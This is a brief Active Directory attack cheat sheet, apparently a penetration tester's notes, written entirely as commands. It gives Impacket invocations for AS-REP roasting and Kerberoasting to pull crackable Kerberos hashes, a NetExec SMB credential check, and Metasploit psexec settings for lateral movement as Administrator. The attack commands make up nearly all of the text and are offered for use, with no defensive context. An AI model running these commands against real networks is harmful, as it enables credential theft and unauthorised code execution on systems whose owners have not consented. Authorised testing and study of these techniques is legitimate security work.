## Active Directory Quick Reference
```bash
-- AS-REP Roasting
GetNPUsers.py domain/user -dc-ip IP -no-pass -request

-- Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip IP -request

-- Validate creds
nxc smb IP -u user -p pass -d DOMAIN

-- Lateral movement
use exploit/windows/smb/psexec
set RHOSTS IP
set SMBUser Administrator
set SMBPass password
set SMBDomain DOMAIN
exploit
```
